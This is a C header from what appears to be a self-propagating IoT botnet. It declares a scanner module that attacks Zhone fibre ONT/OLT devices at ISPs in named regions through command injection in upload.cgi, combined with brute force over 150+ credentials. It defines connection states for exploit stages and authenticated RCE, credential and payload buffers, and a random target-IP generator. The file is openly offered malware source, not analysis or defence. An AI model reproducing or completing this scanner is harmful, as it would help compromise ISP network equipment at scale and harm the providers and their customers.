#ifdef SELFREP

/* ============================================================================
 * ZHONE SCANNER - FTTH/OLT Command Injection (Port 80)
 * ============================================================================
 * Exploit: Zhone ONT/OLT command injection via upload.cgi
 * Targets: FTTH ISPs with Zhone equipment
 * Regions: Latin America, Asia, Middle East, Africa
 * Dual attack: Unauthenticated RCE + authenticated brute-force (150+ creds)
 * ============================================================================ */

#pragma once

#include <stdint.h>

#include "includes.h"

#define ZHONE_SCANNER_MAX_CONNS   256
#define ZHONE_SCANNER_RAW_PPS     788
#define ZHONE_SCANNER_RDBUF_SIZE  2048
#define ZHONE_SCANNER_HACK_DRAIN  64

/* Connection states */
#define ZHONE_SC_CLOSED           0
#define ZHONE_SC_CONNECTING       1
#define ZHONE_SC_GET_CREDENTIALS  2
#define ZHONE_SC_EXPLOIT_STAGE2   3
#define ZHONE_SC_EXPLOIT_STAGE3   4
#define ZHONE_SC_AUTHENTICATING   5
#define ZHONE_SC_AUTHENTICATED    6
#define ZHONE_SC_AUTH_RCE         7

struct zhone_scanner_auth {
    char *username;
    char *password;
    uint16_t weight;
};

struct zhone_scanner_connection
{
    int fd, last_recv;
    uint8_t state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[ZHONE_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[5000], payload_buf2[5000];
    int credential_index;
    char session_id[64];
    uint8_t auth_attempted;
    char current_user[32];
    char current_pass[32];
};

void zhone_scanner_init(void);
void zhone_kill(void);

static void zhone_setup_connection(struct zhone_scanner_connection *);
static ipv4_t get_random_zhone_ip(void);

#endif
